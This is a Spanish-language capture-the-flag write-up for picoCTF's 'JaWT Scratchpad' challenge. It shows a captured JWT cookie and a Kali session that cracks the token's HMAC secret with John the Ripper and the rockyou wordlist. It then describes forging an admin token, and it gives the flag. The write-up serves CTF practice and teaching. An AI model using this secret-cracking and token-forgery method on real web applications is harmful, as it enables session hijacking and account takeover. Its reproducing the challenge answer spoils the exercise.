## JaWT Scratchpad

# objetivo
- Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864

# Hints
- What is that cookie?
- Have you heard of JWT?

# solucion
``` bash 
en este reto podemos ingresar con cualquier nombre, menos con el de admin por que es el especial, nos logeamos con cualquier otro, y en las cookies se guarda una llamada jwt el valor de la cookie:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRvbGZvIn0.xwGSBSJZKY6uP6jroZGLWxImYasw_PDIs8l9YsaAC0o
usamos una paguina llamada jwt para cambiarla,pero nos genera el error INTERNAL SERVER ERROR
entonces tenemos que crakear el token, para esto usamos una lista de palabras que tenemos en linux para decifrar la palabrque se usa para cifrar
(kali㉿kali)-[~]
└─$ nano hash
kali㉿kali)-[~]
└─$ cat hash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRvbGZvIn0.xwGSBSJZKY6uP6jroZGLWxImYasw_PDIs8l9YsaAC0o
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists                                                      
amass  dirb  dirbuster  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt.gz  sqlmap.txt  wfuzz  wifite.txt
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz
gzip: /usr/share/wordlists/rockyou.txt: Permission denied
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
[sudo] password for kali: 
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists                         
amass  dirb  dirbuster  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt  sqlmap.txt  wfuzz  wifite.txt
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ john                                            
Created directory: /home/kali/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:07 DONE (2022-10-11 12:20) 0.1369g/s 1013Kp/s 1013Kc/s 1013KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

y vemos que se uso la palabra "ilovepico" para cifrar el token.
y la ponemos aen la pagina que estabamos usando para modificar el token.
al final lo copeamos, lo guardamos en la cookie, recargamos y nos regresa la bandera.
```
# bandera
- picoCTF{jawt_was_just_what_you_thought_1ca14548}